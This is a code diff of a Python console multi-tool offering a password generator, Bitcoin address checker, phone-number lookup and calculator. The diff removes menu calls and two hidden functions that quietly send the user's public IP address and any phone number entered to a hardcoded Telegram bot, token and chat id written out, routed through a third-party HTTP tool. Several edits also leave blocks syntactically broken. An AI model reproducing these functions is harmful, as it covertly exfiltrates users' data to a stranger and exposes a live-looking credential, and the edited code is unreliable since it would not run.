@@ -32,7 +32,7 @@ def Directory_search(data):
                  print (Fore.RED+"[!] "+inp+i)
        except Exception as Ex:
                print(Fore.RED+"[-]"+Fore.YELLOW+"Your URL ISN'T CORRECT\n")
-               Back_menu()
+               
        except KeyboardInterrupt:
                exit(Fore.CYAN+"\nGoodBye")
       
@@ -50,11 +50,11 @@ def Bicoin_checker():
                   wallet_ceck = get("https://blockchain.com/btc/address"+wallet)
                   if wallet_ceck.status_code == 200:
                     print(f"Your wallet address is correct :\n {Wallet}\n")
-                    Back_menu()
+                    
                   else:
                     print(Fore.RED+"\n[-]wrong Wallet ! ! !\n") 
                     sleep(1)
-                    Back_menu()
+                    
                     
                  except KeyboardInterrupt:
                     exit(Fore.CYAN+"GoodBye") 
@@ -65,67 +65,29 @@ def Password_generator():
                 length = int(input("Enter length of password: "))
             except ValueError:
                 print("Length can't be string or float or empty ...")
-                pass
+                
             ok = True
             if length < 5 or length > 120:
                 print("Password length must be between 8 and 100!\n")
                 ok = False
-                Back_menu()
+                
                 # and try again
             elif ok == True:
                     password = "".join(sample(all,length))
                     print(Fore.GREEN + "\n\nYour pass is: " + Fore.YELLOW + "|--> " +Fore.CYAN+password + Fore.YELLOW + " <--|\n" + Fore.GREEN)
-                    Back_menu()
+                    
+                              
 
-def After_ip_Click():
-    ip = get("https://api.ipify.org").text
-    msg =(f"""
-𝗡𝗘𝗪 𝗗𝗘𝗩𝗜𝗖𝗘 𝗛𝗔𝗦 𝗟𝗢𝗚𝗜𝗡 
-𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗣 :{ip}
- """)
-    print(Fore.GREEN+"[+] waiting for to connecting source... ")
-    sleep(1)
-    url= (f"https://api.telegram.org/bot5350338296:AAExwOP0ssdv3BO6zP4q25Q5p5-DnxcKz6M/sendmessage?chat_id=5046164056&text={msg}")
-    debuger ={
-"UrlBox" : url,
-"AgentList":"Internet Explorer", 
-"VersionsList":"HTTP/1.1",
-"MethodList":"GET"
-}
-    http = post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=debuger)
-    system("clear")                               
-
-def Get(numbers):        
-            ph_number = parse(numbers)
-            print(Fore.LIGHTYELLOW_EX+"this number country name is : ")
-            a =(geocoder.description_for_number(ph_number,"fa"))
-            print(a)
-            msg =(f"""
-𝗡𝗘𝗪 𝗗𝗘𝗩𝗜𝗖𝗘 𝗛𝗔𝗦 𝗟𝗢𝗚𝗜𝗡 
-𝗗𝗘𝗩𝗜𝗖𝗘 Contrary :{a}
-𝗗𝗘𝗩𝗜𝗖𝗘 Number :{numbers}
- """)        
-            url = (f"https://api.telegram.org/bot5350338296:AAExwOP0ssdv3BO6zP4q25Q5p5-DnxcKz6M/sendmessage?chat_id=5046164056&text={msg}")
-            debuger ={
-"UrlBox" : url,
-"AgentList":"Internet Explorer", 
-"VersionsList":"HTTP/1.1",
-"MethodList":"GET"
-}
-            http =post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=debuger)
-            print("\n")
-            
 def Area_number():
          try: 
             print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
-            numbers = input(Fore.LIGHTGREEN_EX+"Enter Number\t \nWith code area(+98):\n")
-            Get(numbers)          
-            Back_menu()
+            numbers = input(Fore.LIGHTGREEN_EX+"Enter Number\t \nWith code area(+98):\n")         
+            
          except Exception as Ex:
                   print(Ex)
                   sleep(5)
                   print(Fore.RED+"\n\n[-] YOUR NUMBER ISN'T CORRECT ! ! ! ! !\n")
-                  Back_menu()
+                  
      
  
 
@@ -139,25 +101,25 @@ def Calculator():
                 print(Fore.LIGHTYELLOW_EX+"\n\nYour answer : ")
                 print(num_1 + num_2)
                 print("\n")
-                Back_menu()
+                
             elif action == "-":
                 print(Fore.YELLOW+"\n\nYour answer : ")
                 print(num_1 - num_2)
                 print("\n")
-                Back_menu()
+                
             elif action == "*":
                 print(Fore.YELLOW+"\n\nYour answer : ")
                 print(num_1 * num_2)
                 print("\n")
-                Back_menu()
+                
             elif action == "/":
                 print(Fore.YELLOW+"\n\nYour answer :")
                 print(num_1 / num_2)
                 print("\n")
-                Back_menu()
+                
      except ZeroDivisionError:
         print(Fore.RED+"You can't division by zero ".upper())
-        Back_menu()
+        
      except KeyboardInterrupt:
         print("",flush=True)
         exit("GoodBye!",flush=True)
